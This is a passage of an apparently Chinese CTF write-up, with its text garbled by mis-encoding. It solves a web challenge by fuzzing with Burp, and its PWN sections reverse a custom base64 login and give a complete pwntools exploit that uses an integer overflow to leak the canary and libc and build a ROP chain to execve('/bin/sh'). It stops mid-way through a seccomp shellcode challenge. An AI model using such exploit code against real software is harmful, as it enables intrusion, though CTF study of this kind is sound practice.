æ­¤è¦æƒ³æŸ¥çœ‹flagï¼Œtypeçš„å‚æ•°éœ€è¦æ˜¯secretsçš„å˜ä½“ï¼Œé¡µé¢ä¸Šç»™secretsçš„tsåˆ’äº†ä¸‹åˆ’çº¿ï¼ŒçŒœæµ‹æ˜¯æç¤ºå°†è¿™ä¸¤ä¸ªå­—ç¬¦æ¢æˆç‰¹æ®Šå­—ç¬¦ã€‚</p><p>æ‰“å¼€Burpçš„intruderï¼Œpayloadé€‰ç”¨simple listï¼Œä»ç½‘ä¸Šä¸‹è½½äº†ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦çš„åˆ—è¡¨æ¥çˆ†ç ´<code>ts</code>ã€‚</p><p>æœ€åtsæ›¿æ¢æˆÃ†Â¾æ—¶ï¼Œresponseçš„lengthä¸ä¸€æ ·ï¼Œç‚¹è¿›å»çœ‹è¯¦æƒ…å°±èƒ½çœ‹åˆ°flagã€‚</p><p><img src="https://bu.dusays.com/2024/04/26/662b49479e6b2.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b49479e6b2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="intruder"></p><p>flag: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ops{sTR1Ngs_WitH_tHE_s@mE_we1ghT_aRe_3QUAl_iN_my5q1}</span><br></pre></td></tr></tbody></table></figure><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Memo0"><a href="#Memo0" class="headerlink" title="Memo0"></a>Memo0</h3><p>æœ¬é¢˜çš„æ¼æ´ç‚¹æ˜¯<del>æ•´æ•°æº¢å‡ºå’Œæ ˆæº¢å‡º</del>ã€‚ä½†æ˜¯ç”¨ä¸åˆ°ï¼Œåªéœ€è¦é€†å‘å‡ºå¯†ç ã€‚</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆè¦è¾“å…¥å¯†ç ç™»å½•ï¼Œå¯†ç é€šè¿‡ä¸€ä¸ªåŠ å¯†ç®—æ³•åä¸<code>J8ITC7oaC7ofwTEbACM9zD4mC7oayqY9C7o9Kd==</code>å¯¹æ¯”ï¼Œé•¿å¾—å¾ˆåƒbase64ï¼Œä½†æ˜¯ç”¨base64è§£ç å‡ºæ¥ä¸å¯¹ã€‚æŠŠ<code>sub_12E9</code>çš„åŠ å¯†å‡½æ•°ä¸¢ç»™claudeï¼Œç›´æ¥é€†å‡ºäº†å¯†ç ã€‚ã€‚ã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">encoded_data</span>):</span><br><span class="line">    <span class="comment"># è®¡ç®—è§£ç åçš„æ•°æ®é•¿åº¦</span></span><br><span class="line">    length = <span class="built_in">len</span>(encoded_data)</span><br><span class="line">    decoded_length = (length * <span class="number">3</span>) // <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> encoded_data[-<span class="number">1</span>] == <span class="string">'='</span>:</span><br><span class="line">        decoded_length -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> encoded_data[-<span class="number">2</span>] == <span class="string">'='</span>:</span><br><span class="line">        decoded_length -= <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºè§£ç åçš„æ•°æ®ç¼“å†²åŒº</span></span><br><span class="line">    decoded = <span class="built_in">bytearray</span>(decoded_length)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ ‡å‡† Base64 å­—ç¬¦æ˜ å°„è¡¨</span></span><br><span class="line">    base64_chars = <span class="string">"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># éå†ç¼–ç æ•°æ®å¹¶è§£ç </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length, <span class="number">4</span>):</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> i + j &lt; length:</span><br><span class="line">                char = encoded_data[i + j]</span><br><span class="line">                <span class="keyword">if</span> char == <span class="string">'='</span>:</span><br><span class="line">                    value &lt;&lt;= <span class="number">6</span> * (<span class="number">3</span> - j)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    value |= base64_chars.index(char) &lt;&lt; <span class="number">6</span> * (<span class="number">3</span> - j)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å°† 24 ä½å€¼æ‹†åˆ†æˆ 3 ä¸ªå­—èŠ‚å¹¶å†™å…¥è§£ç åçš„æ•°æ®</span></span><br><span class="line">        decoded_pos = i // <span class="number">4</span> * <span class="number">3</span></span><br><span class="line">        decoded[decoded_pos] = (value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">if</span> decoded_pos + <span class="number">1</span> &lt; decoded_length:</span><br><span class="line">            decoded[decoded_pos + <span class="number">1</span>] = (value &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">if</span> decoded_pos + <span class="number">2</span> &lt; decoded_length:</span><br><span class="line">            decoded[decoded_pos + <span class="number">2</span>] = value &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decoded.decode(<span class="string">'latin-1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decode(<span class="string">'J8ITC7oaC7ofwTEbACM9zD4mC7oayqY9C7o9Kd=='</span>))</span><br><span class="line"><span class="comment"># CTF_is_interesting_isn0t_itÃ€</span></span><br></pre></td></tr></tbody></table></figure><p>ä½†æ˜¯å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œå°†<code>Ã€</code>æ”¹æˆ<code>?</code>å°±å¯¹äº†ã€‚</p><p>ä¸€å¼€å§‹æ²¡æœ‰åœ¨æœ¬åœ°æ–°å»º<code>flag</code>æ–‡ä»¶ï¼Œidaé‡Œé¢è¿˜æŠŠ<code>win</code>å‡½æ•°çœ‹æ¼äº†ã€‚ã€‚ã€‚å¯¼è‡´è¿˜åœ¨ç»§ç»­ç”¨æ ˆæº¢å‡ºå»åŠ«æŒcontrol flowè°ƒç”¨<code>win</code>ï¼Œå…¶å®é€†å‘å‡ºå¯†ç å°±å¯ä»¥å¾—åˆ°flagã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">111.186</span><span class="number">.57</span><span class="number">.85</span> <span class="number">40310</span></span><br><span class="line">===================Memo Login===================</span><br><span class="line">Please enter your password: CTF_is_interesting_isn0t_it?</span><br><span class="line">Login Success!</span><br><span class="line">0ops{U_r_th3_ma5ter_0f_ba5e64}</span><br></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ops{U_r_th3_ma5ter_0f_ba5e64}</span><br></pre></td></tr></tbody></table></figure><h3 id="Memo1"><a href="#Memo1" class="headerlink" title="Memo1"></a>Memo1</h3><p>æœ¬é¢˜çš„æ¼æ´ç‚¹æ˜¯æ•´æ•°æº¢å‡ºå’Œæ ˆæº¢å‡ºã€‚</p><p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><p>é¦–å…ˆchecksecï¼š</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RUNPATH:  b'.'</span><br></pre></td></tr></tbody></table></figure><p>ä¿æŠ¤å…¨å¼€ã€‚ç„¶åçœ‹mainå‡½æ•°ï¼Œå‘ç°ä¾›ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨æ ˆä¸Šï¼Œå¤§å°æ˜¯264å­—èŠ‚ï¼Œä¹ä¸€çœ‹ç”¨æˆ·ä¹Ÿåªèƒ½è¾“å…¥0x100å³256å­—èŠ‚ï¼Œå¾ˆå®‰å…¨ã€‚ä½†æ˜¯åœ¨å®ç°<code>edit</code>åŠŸèƒ½çš„å‡½æ•°é‡Œé¢ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, aLld       ; "%lld"</span><br><span class="line">mov     rdi, rax</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    ___isoc99_scanf</span><br><span class="line">mov     edx, [rbp+var_1C]</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">cmp     rdx, rax</span><br><span class="line">jle     short loc_1873</span><br><span class="line">mov     rax, [rbp+var_10]</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     rax, [rbp+var_18]</span><br><span class="line">mov     esi, edx</span><br><span class="line">mov     rdi, rax</span><br><span class="line">call    sub_170E</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥å‘ç°ï¼Œå…è®¸ç”¨æˆ·è¾“å…¥çš„æ˜¯æœ‰ç¬¦å·æ•°ï¼Œè€Œæ¯”è¾ƒçš„æ—¶å€™å´æ˜¯æ ¹æ®æ— ç¬¦å·æ•°è¿›è¡Œæ¯”è¾ƒï¼Œç„¶ååœ¨è¯»å–ç”¨æˆ·è¾“å…¥çš„æ—¶å€™åˆä½¿ç”¨å…¶ä½32ä½ä½œä¸ºå…è®¸è¾“å…¥çš„é•¿åº¦ï¼Œå› æ­¤ä¼šå‡ºç°ç±»ä¼¼<code>0xffffffff00000109 &lt; 0x8</code>çš„æƒ…å†µï¼Œå´å…è®¸ç”¨æˆ·è¾“å…¥<code>0x109</code>ä¸ªå­—èŠ‚ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿè¾“å…¥æˆ‘ä»¬æƒ³è¦çš„é•¿åº¦ï¼Œéœ€è¦å°†<code>0xffffffff00000109</code>è¿™æ ·çš„æ•°è½¬æ¢æˆç›¸åº”çš„è´Ÿæ•°ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_signed</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> (-<span class="number">1</span>)*(<span class="number">0xffffffff</span>-num)-<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ€»ç»“ä¸€ä¸‹èƒ½å¤Ÿåˆ©ç”¨çš„æ¼æ´ï¼š</p><p>å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡ºåœ¨æ ˆä¸Šå†™éå¸¸é•¿çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºåŠ«æŒç¨‹åºæ§åˆ¶æµã€‚</p><p>ä½†æ˜¯ç”±äºä¿æŠ¤å…¨å¼€ä¸”æ²¡æœ‰winå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆleak canaryï¼Œç„¶åleak libcï¼Œæœ€ååœ¨æ ˆä¸Šå¸ƒå±€ ROP chain æ¥ get shellã€‚</p><p>æˆ‘ä»¬å…ˆåœ¨<code>sub_170e</code>å‡½æ•°ï¼ˆè¯»å–ç”¨æˆ·è¾“å…¥çš„å‡½æ•°ï¼‰å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œè§‚å¯Ÿæ ˆçš„å¸ƒå±€ã€‚</p><p><img src="https://bu.dusays.com/2024/04/26/662b4963cbd53.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b4963cbd53.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="stack"></p><p>å‘ç°canaryè·ç¦»ç”¨æˆ·è¾“å…¥çš„èµ·å§‹ä½ç½®ä¸º0x108å­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¦†ç›–ç”¨æˆ·è¾“å…¥çš„å‰0x109å­—èŠ‚ä¸ºé0å­—ç¬¦ï¼Œç„¶åè°ƒç”¨showå°±å¯ä»¥è¿å¸¦canaryä¸€èµ·è¾“å‡ºå‡ºæ¥ã€‚è€Œè¯»å–ç”¨æˆ·è¾“å…¥çš„<code>sub_170e</code>å‡½æ•°æ˜¯ä¸€ä¸ªå¸¦0æˆªæ–­çš„å‡½æ•°ï¼šå½“æˆ‘ä»¬è¾“å…¥<code>\n</code>ä¼šè¢«æ›¿æ¢æˆ<code>\x00</code>ï¼Œå¦‚æœé•¿åº¦å‚æ•°æ­£å¥½ç­‰äºæˆ‘ä»¬è¾“å…¥çš„é•¿åº¦ï¼Œå°±ä¸ä¼šæ·»0ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦è®©å…¶é•¿åº¦å‚æ•°æ°å¥½ç­‰äº0x109ï¼Œä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨<code>edit</code>æ—¶ï¼Œè¾“å…¥çš„é•¿åº¦ä¸º<code>convert_to_signed(0x109)</code>ã€‚ç„¶åè¾“å…¥0x109ä¸ª<code>A</code>ï¼Œå†è°ƒç”¨showï¼Œæœ€å7ä½å°±æ˜¯canaryçš„é«˜7ä½ã€‚</p><p>ç”¨æˆ·è¾“å…¥çš„èµ·å§‹ä½ç½®åŠ ä¸Š0x118ä¸ªå­—èŠ‚æ˜¯libcçš„åœ°å€ï¼Œä¸åŸºåœ°å€çš„åç§»æ˜¯0x29d90ï¼Œä½¿ç”¨å’Œleak canaryå‡ ä¹ä¸€æ ·çš„æ–¹æ³•å¯ä»¥leak libcã€‚</p><p>æœ€åå°±æ˜¯åœ¨æ ˆä¸Šå¸ƒå±€ rop chain äº†ã€‚å› ä¸ºæœ‰libcï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç”¨libcçš„gadgetsï¼Œä½¿ç”¨pwntoolsæ„é€ ä¸€ä¸ªexecve(â€˜/bin/shâ€™,0,0)çš„Ropï¼Œåœ¨æ ˆä¸Šcanaryçš„ä½ç½®å¡«å…¥canaryï¼Œè¿”å›åœ°å€å¤„å¸ƒå±€rop chainï¼Œå³å¯å¾—åˆ°shellã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(libc)</span><br><span class="line">rop.execve(<span class="built_in">next</span>(libc.search(<span class="string">b'/bin/sh\x00'</span>)), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b'A'</span> * <span class="number">0x108</span> + p64(canary) + <span class="string">b'B'</span> * <span class="number">0x8</span> + rop.chain()</span><br><span class="line">edit(convert_to_signed(<span class="built_in">len</span>(payload)), payload)</span><br></pre></td></tr></tbody></table></figure><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">'./memo1'</span>)</span><br><span class="line">libc = binary.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(binary.path)</span></span><br><span class="line">p = remote(<span class="string">'111.186.57.85'</span>, <span class="number">40311</span>)</span><br><span class="line"></span><br><span class="line">password = <span class="string">b'CTF_is_interesting_isn0t_it?'</span></span><br><span class="line">p.recvuntil(<span class="string">b'Please enter your password: '</span>)</span><br><span class="line">p.sendline(password)</span><br><span class="line"><span class="comment"># then it is a overflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b'Your choice:'</span>, <span class="string">b'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b'What do you want to write in the memo:'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b'Your choice:'</span>, <span class="string">b'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Content:\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">length, payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b'Your choice:'</span>, <span class="string">b'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b'How many characters do you want to change:'</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b'Your choice:'</span>, <span class="string">b'114514'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># beause there is a jle instruction, so we can use negative number to bypass it</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_signed</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> (-<span class="number">1</span>)*(<span class="number">0xffffffff</span>-num)-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">main_offset = <span class="number">0x1938</span></span><br><span class="line">libc_offset = <span class="number">0x29d90</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### first leak canary</span></span><br><span class="line">add(<span class="string">b'A'</span> * <span class="number">0x8</span>)</span><br><span class="line">edit(convert_to_signed(<span class="number">0x109</span>), <span class="string">b'A'</span>*<span class="number">0x109</span>)</span><br><span class="line">response = show()</span><br><span class="line">canary = response[<span class="number">0x109</span>:<span class="number">0x109</span>+<span class="number">7</span>].rjust(<span class="number">8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">canary = u64(canary)</span><br><span class="line">info(<span class="string">f'[LEAK]: canary: <span class="subst">{<span class="built_in">hex</span>(canary)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### leak libc address</span></span><br><span class="line">payload = <span class="string">b'A'</span> * <span class="number">0x118</span></span><br><span class="line">edit(convert_to_signed(<span class="built_in">len</span>(payload)), payload)</span><br><span class="line">response = show()</span><br><span class="line">libc_leak = response[<span class="number">0x118</span>:<span class="number">0x118</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">libc_leak = u64(libc_leak)</span><br><span class="line">info(<span class="string">f'[LEAK]: libc_leak: <span class="subst">{<span class="built_in">hex</span>(libc_leak)}</span>'</span>)</span><br><span class="line">libc.address = libc_leak - libc_offset</span><br><span class="line">info(<span class="string">f'[LEAK &amp; CALC]: libc_base: <span class="subst">{<span class="built_in">hex</span>(libc.address)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### leak pie address</span></span><br><span class="line"><span class="comment"># payload = b'A' * 0x128</span></span><br><span class="line"><span class="comment"># edit(convert_to_signed(len(payload)), payload)</span></span><br><span class="line"><span class="comment"># response = show()</span></span><br><span class="line"><span class="comment"># main_addr = response[0x128:0x128+6].ljust(8, b'\x00')</span></span><br><span class="line"><span class="comment"># main_addr = u64(main_addr)</span></span><br><span class="line"><span class="comment"># elf.address = main_addr - main_offset</span></span><br><span class="line"><span class="comment"># info(f'[LEAK &amp; CALC]: pie_base: {hex(elf.address)}')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, '''</span></span><br><span class="line"><span class="comment"># ''')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### no win_func now, wo we use rop</span></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rop.execve(<span class="built_in">next</span>(libc.search(<span class="string">b'/bin/sh\x00'</span>)), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b'A'</span> * <span class="number">0x108</span> + p64(canary) + <span class="string">b'B'</span> * <span class="number">0x8</span> + rop.chain()</span><br><span class="line">edit(convert_to_signed(<span class="built_in">len</span>(payload)), payload)</span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></tbody></table></figure><p>flag: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0ops{5t4ck_0v3rfl0w_1s_d4ng3r0u5_233}</span><br></pre></td></tr></tbody></table></figure><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>æœ¬é¢˜çš„è€ƒå¯Ÿç‚¹æ­£å¦‚é¢˜åæ˜¯shellcodeï¼Œä½†æ˜¯seccompåªå…è®¸äº†openå’Œreadï¼Œæ²¡æœ‰writeï¼Œå› æ­¤éœ€è¦åˆ©ç”¨å¾ªç¯æ¥å®ç°ç±»ä¼¼ä¾§ä¿¡é“æ”»å‡»ã€‚å¦å¤–ï¼Œå¯¹shellcodeçš„å­—èŠ‚åšäº†é™åˆ¶ï¼š</p><ol><li><p>å¶æ•°ç´¢å¼•å¤„çš„å­—èŠ‚å¿…é¡»æ˜¯å¶æ•°ï¼Œå¥‡æ•°ç´¢å¼•å¤„çš„å­—èŠ‚å¿…é¡»æ˜¯å¥‡æ•°</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">char</span>)(*((<span class="type">char</span> *)buf + i) % <span class="number">2</span>) != i % <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>å¤§äº0x80çš„å¥‡æ•°ä¸èƒ½ç”¨</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, [rbp+buf]</span><br><span class="line">add     rax, rdx</span><br><span class="line">movzx   eax, byte ptr [rax]</span><br><span class="line">mov     edx, eax</span><br><span class="line">sar     dl, 7</span><br><span class="line">shr     dl, 7</span><br><span class="line">add     eax, edx</span><br><span class="line">and     eax, 1</span><br><span class="line">sub     eax, edx</span><br><span class="line">movsx   ecx, al</span><br></pre></td></tr></tbody></table></figure><p>è¿™æ®µå®é™…ä¸Šæ˜¯å°†shellcodeçš„å­—èŠ‚ä½œä¸ºä¸€å­—èŠ‚çš„æœ‰ç¬¦å·æ•°æ¥å¯¹2å–æ¨¡ï¼Œå› æ­¤ç±»ä¼¼äº0x81è¿™æ ·çš„å¤§äº0x80çš„å¥‡æ•°æ¨¡2åçš„ç»“æœæ˜¯-1è€Œä¸æ˜¯1ï¼Œä½†æ˜¯å¯¹ç´¢å¼•çš„å–æ¨¡æ˜¯çœ‹ä½œæ— ç¬¦å·æ•°ï¼Œå› æ­¤å¥‡æ•°ç´¢å¼•å¤„å–æ¨¡æ˜¯1è€Œä¸ç­‰äº-1ã€‚è¿™ä¹Ÿå°±ä»£è¡¨ç€å¤§äº0x80çš„å¥‡æ•°ä¸èƒ½å‡ºç°åœ¨shellcodeä¸­ï¼Œè¿™ç‚¹éå¸¸å‘ã€‚ã€‚ã€‚æ¯”å‰ä¸€ç‚¹é™åˆ¶èŠ±äº†æˆ‘æ›´å¤šæ—¶é—´ã€‚å› ä¸ºè¿™ä¸ªé™åˆ¶ç›¸å½“äºæŠŠä¸€èˆ¬çš„jmpé•¿è·³è½¬ã€callã€retã€syscallå…¨éƒ½ç¦æ­¢æ‰äº†ã€‚</p><p>æ€è·¯ï¼š</p><p>ç”±äºæˆ‘ä»¬è¿˜è¦è¿›è¡Œä¾§ä¿¡é“æ”»å‡»ï¼Œä¸å¯èƒ½æ¯çˆ†ç ´ä¸€ä¸ªå­—èŠ‚éƒ½æ„é€ ä¸€ä¸ªèƒ½æ»¡è¶³è¦æ±‚çš„shellcodeï¼Œå› æ­¤è€ƒè™‘åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p><ul><li>é˜¶æ®µ1ï¼šè°ƒç”¨readå‡½æ•°ï¼Œrdiè®¾ç½®ä¸€é˜¶æ®µshellcodeçš„èµ·å§‹ä½ç½®ï¼Œå¹¶å°†è¿”å›åœ°å€è®¾ç½®ä¸ºè¿™ä¸ªèµ·å§‹åœ°å€</li><li>é˜¶æ®µ2ï¼šè¾“å…¥äºŒé˜¶æ®µè¿›è¡Œä¾§ä¿¡é“æ”»å‡»çš„shellcodeï¼Œreadå°†è¿”å›åˆ°æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªshellcode</li></ul><p>æ¯ä¸ªäºŒé˜¶æ®µshellcodeçˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼šå°†[flag_addr+i]ä¸æ¯ä¸ªå¯è§å­—ç¬¦ä½œæ¯”è¾ƒï¼Œç›¸ç­‰æ—¶è¿›å…¥æ­»å¾ªç¯ï¼Œé€šè¿‡å¯¹æ—¶é—´çš„æµ‹é‡å°±èƒ½çŸ¥é“flagçš„æ¯ä¸ªå­—èŠ‚æ˜¯å“ªä¸ªå­—ç¬¦å€¼ã€‚</p><p>å¼€å‡‘ï¼š</p><p>å…ˆå‡‘ä¸€é˜¶æ®µçš„shellcodeã€‚ç”±äºé™åˆ¶éå¸¸å¤šï¼Œå› æ­¤è€ƒè™‘å°½é‡åˆ©ç”¨æ 